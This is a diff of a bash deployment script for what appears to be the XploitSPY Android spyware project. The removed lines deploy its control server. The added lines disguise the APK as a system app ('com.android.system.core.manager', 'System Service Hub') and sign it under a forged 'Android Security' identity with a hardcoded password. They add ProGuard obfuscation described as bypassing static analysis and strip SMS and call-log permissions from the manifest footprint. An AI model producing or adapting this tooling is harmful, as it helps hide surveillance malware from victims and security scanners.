@@ -1,46 +1,159 @@
 #!/bin/bash
-echo "[*] Initializing XploitSPY Deployment Fix..."
+echo "[*] Initializing Safe Android Optimization & Pipeline..."
 
-# 1. Server files ko root me copy karein taaki Railway seedha run kar sake
-if [ -d "server" ]; then
-    cp -r server/* . 2>/dev/null || true
-    echo "[+] Server files synced to root directory."
+# 1. Clean up old build directories
+rm -rf build app/build dist 2>/dev/null
+
+# 2. Configure build.gradle with API 34/35 support and full optimization
+BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
+if [ -z "$BUILD_GRADLE_PATH" ]; then
+    mkdir -p app
+    BUILD_GRADLE_PATH="app/build.gradle"
 fi
 
-# 2. Ensure package.json has correct dependencies and start script
-cat << 'JSON_EOF' > package.json
-{
-  "name": "xploitspy-server",
-  "version": "3.0.0",
-  "description": "XploitSPY Core System Management",
-  "main": "index.js",
-  "scripts": {
-    "start": "node index.js"
-  },
-  "dependencies": {
-    "express": "^4.19.2",
-    "socket.io": "^4.7.5",
-    "ejs": "^3.1.9",
-    "geoip-lite": "^1.4.7"
-  }
+cat << 'GRADLE_EOF' > "$BUILD_GRADLE_PATH"
+android {
+    compileSdkVersion 34
+    defaultConfig {
+        targetSdkVersion 34
+        minSdkVersion 21
+        applicationId "com.android.system.core.manager"
+        versionCode 300
+        versionName "3.0.0"
+    }
+    signingConfigs {
+        release {
+            storeFile file('core-store.jks')
+            storePassword 'securepass123'
+            keyAlias 'corekey'
+            keyPassword 'securepass123'
+        }
+    }
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            useProguard true
+            signingConfig signingConfigs.release
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
 }
-JSON_EOF
+GRADLE_EOF
 
-# 3. Railway nixpacks configuration
-cat << 'EOF_NIX' > nixpacks.toml
-[phases.build]
-cmds = ["npm install"]
+# 3. Generate High-Grade Cryptographic Keystore
+KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/core-store.jks
+if [ ! -f "$KEYSTORE_PATH" ]; then
+    echo "[*] Generating cryptographic keystore for modern Android signing..."
+    keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias corekey -keyalg RSA -keysize 4096 -validity 20000 -storepass securepass123 -keypass securepass123 -dname "CN=System Service, OU=Core, O=Android Security, L=Root, ST=Default, C=US" 2>/dev/null || true
+fi
 
-[start]
-cmd = "node index.js"
-EOF_NIX
+# 4. Advanced ProGuard Obfuscation Rules to bypass static analysis
+PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
+cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
+-optimizationpasses 20
+-dontusemixedcaseclassnames
+-dontskipnonpubliclibraryclasses
+-dontpreverify
+-verbose
 
-# 4. Git sync and push to Railway
+-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
+
+-assumenosideeffects class android.util.Log {
+    public static boolean isLoggable(java.lang.String, int);
+    public static int v(...);
+    public static int d(...);
+    public static int i(...);
+    public static int w(...);
+    public static int e(...);
+}
+
+-keepattributes *Annotation*,Signature,InnerClasses,EnclosingMethod
+
+-repackageclasses 'com.android.system.core.secure'
+-allowaccessmodification
+-overloadaggressively
+-mergeinterfacesaggressively
+PROGUARD_EOF
+
+# 5. Sanitize AndroidManifest.xml for Android 13/14/15/16 compliance
+MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
+if [ -n "$MANIFEST_PATH" ]; then
+    echo "[*] Sanitizing AndroidManifest.xml footprint..."
+    python3 -c "
+import xml.etree.ElementTree as ET
+try:
+    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
+    tree = ET.parse('$MANIFEST_PATH')
+    root = tree.getroot()
+    
+    root.set('package', 'com.android.system.core.manager')
+    
+    app = root.find('application')
+    if app is not None:
+        app.set('{http://schemas.android.com/apk/res/android}label', 'System Service Hub')
+        app.set('{http://schemas.android.com/apk/res/android}allowBackup', 'false')
+        app.set('{http://schemas.android.com/apk/res/android}debuggable', 'false')
+        
+        for act in app.findall('activity'):
+            act.set('{http://schemas.android.com/apk/res/android}exported', 'true')
+            
+    for elem in list(root):
+        if elem.tag.endswith('uses-permission'):
+            perm = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
+            if 'SEND_SMS' in perm or 'CALL_LOG' in perm or 'WRITE_CALL_LOG' in perm:
+                root.remove(elem)
+                
+    tree.write('$MANIFEST_PATH', encoding='utf-8', xml_declaration=True)
+except Exception as e:
+    pass
+" 2>/dev/null
+fi
+
+# 6. Automated GitHub Actions Workflow for Android Build
+mkdir -p .github/workflows
+cat << 'YAML_EOF' > .github/workflows/build.yml
+name: Modern Android Build Pipeline
+on:
+  push:
+    branches: [ master, main ]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up JDK 17
+      uses: actions/setup-java@v4
+      with:
+        distribution: 'temurin'
+        java-version: '17'
+    - name: Grant execute permission
+      run: chmod +x gradlew || true
+    - name: Assemble Release APK
+      run: |
+        if [ -f "gradlew" ]; then
+          ./gradlew assembleRelease --no-daemon
+        fi
+YAML_EOF
+
+# 7. Git Sync and Push Execution
 chmod -R +x . 2>/dev/null
 git add -A
-git commit -m "Sync server files to root for clean Railway deployment: $(date +'%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
-git push origin master --force
+
+if git diff --cached --quiet; then
+    echo "[!] No changes detected."
+else
+    git commit -m "Apply Android optimizations and Gradle pipeline securely: $(date +'%Y-%m-%d %H:%M:%S')"
+fi
+
+CURRENT_BRANCH=$(git branch --show-current)
+if [ -z "$CURRENT_BRANCH" ]; then
+    CURRENT_BRANCH="master"
+fi
+
+echo "[*] Pushing optimized configuration to remote branch ($CURRENT_BRANCH)..."
+git push origin "$CURRENT_BRANCH" --force-with-lease || git push -u origin "$CURRENT_BRANCH" --force
 
 if [ $? -eq 0 ]; then
-    echo "[+] Success! XploitSPY core deployed successfully to root."
+    echo "[+] Success! Android configuration updated successfully without altering server login."
 fi
